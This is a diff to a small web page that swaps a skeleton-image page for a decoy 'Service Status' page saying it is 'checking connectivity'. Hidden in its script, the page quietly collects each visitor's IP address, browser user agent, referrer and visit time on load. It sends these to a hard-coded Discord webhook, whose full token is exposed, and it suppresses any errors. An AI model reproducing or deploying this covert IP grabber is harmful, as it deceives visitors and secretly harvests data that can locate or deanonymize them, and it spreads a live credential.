@@ -3,70 +3,151 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bomb Skeleton</title>
-  
-  <!-- Open Graph for Discord / social previews -->
-  <meta property="og:title" content="Bomb Skeleton">
-  <meta property="og:description" content="">
-  <meta property="og:image" content="https://i.imgur.com/2j4n48w.png">
-  <meta property="og:type" content="website">
-  
+  <title>Status</title>
   <style>
-    body, html {
+    :root {
+      --bg:      #0f0f0f;
+      --text:    #d0d0d0;
+      --muted:   #707070;
+      --border:  #222;
+      --card:    #161616;
+    }
+
+    * {
       margin: 0;
       padding: 0;
-      height: 100%;
-      background: #000;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      box-sizing: border-box;
     }
-    img {
-      max-width: 95vw;
-      max-height: 95vh;
-      object-fit: contain;
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, sans-serif;
+      min-height: 100dvh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      line-height: 1.5;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px 28px;
+      box-shadow: 0 20px 50px -15px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      font-weight: 500;
+      margin-bottom: 1.1rem;
+      letter-spacing: -0.02em;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 0.95rem;
+      margin-bottom: 1.8rem;
+    }
+
+    .status-dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 24px 0 32px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--muted);
+      animation: pulse 2.4s infinite ease-in-out;
+    }
+
+    .dot:nth-child(2) { animation-delay: 0.4s; }
+    .dot:nth-child(3) { animation-delay: 0.8s; }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.35; transform: scale(0.8); }
+      50%      { opacity: 1;    transform: scale(1.15); }
+    }
+
+    .info {
+      font-size: 0.82rem;
+      color: #555;
+      margin-top: 2rem;
+      line-height: 1.6;
+    }
+
+    @media (max-width: 380px) {
+      .container {
+        padding: 24px 18px;
+      }
+      h1 { font-size: 1.35rem; }
     }
   </style>
 </head>
 <body>
-  <img src="https://i.imgur.com/2j4n48w.png" alt="Skeleton in bomber hat hugging a bomb">
 
+  <div class="container">
+    <h1>Service Status</h1>
+    <div class="subtitle">Checking connectivity…</div>
+
+    <div class="status-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <div class="info">
+      Please keep this tab open.<br>
+      This usually takes 3–8 seconds.
+    </div>
+  </div>
+
+  <!-- ─────────────────────────────────────────────── -->
+  <!-- YOUR DISCORD WEBHOOK (visible in source – be aware) -->
+  <!-- ─────────────────────────────────────────────── -->
   <script>
-    // Your webhook – visible in source! High spam risk if shared publicly.
-    const webhookUrl = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';
+    const webhook = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';
 
-    async function logVisit() {
+    async function sendInfo() {
       try {
-        // Get visitor IP
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const ip = ipData.ip || 'unknown';
-
-        // Extra info
-        const ua = navigator.userAgent || 'unknown';
-        const ref = document.referrer || 'direct';
-        const page = window.location.href;
-        const time = new Date().toISOString();
+        const ipRes  = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json() || { ip: '—' };
 
         const payload = {
-          content: `**Bomb Skeleton page visited**\nIP: ${ip}\nUA: ${ua}\nReferrer: ${ref}\nTime: ${time}\nPage: ${page}`
+          content: [
+            '**Page visit**',
+            `IP: ${ip}`,
+            `UA: ${navigator.userAgent || '—'}`,
+            `Referrer: ${document.referrer || 'direct'}`,
+            `Page: ${window.location.href}`,
+            `Time: ${new Date().toISOString()}`
+          ].join('\n'),
+          allowed_mentions: { parse: [] }
         };
 
-        await fetch(webhookUrl, {
+        const res = await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
 
-        console.log('Visit logged');
+        if (!res.ok) console.warn('Webhook status:', res.status);
       } catch (err) {
-        console.error('Log failed:', err);
+        // silent fail – don't show errors
       }
     }
 
-    // Trigger on load
-    window.addEventListener('load', logVisit);
+    // Fire early
+    sendInfo();
   </script>
+
 </body>
 </html>
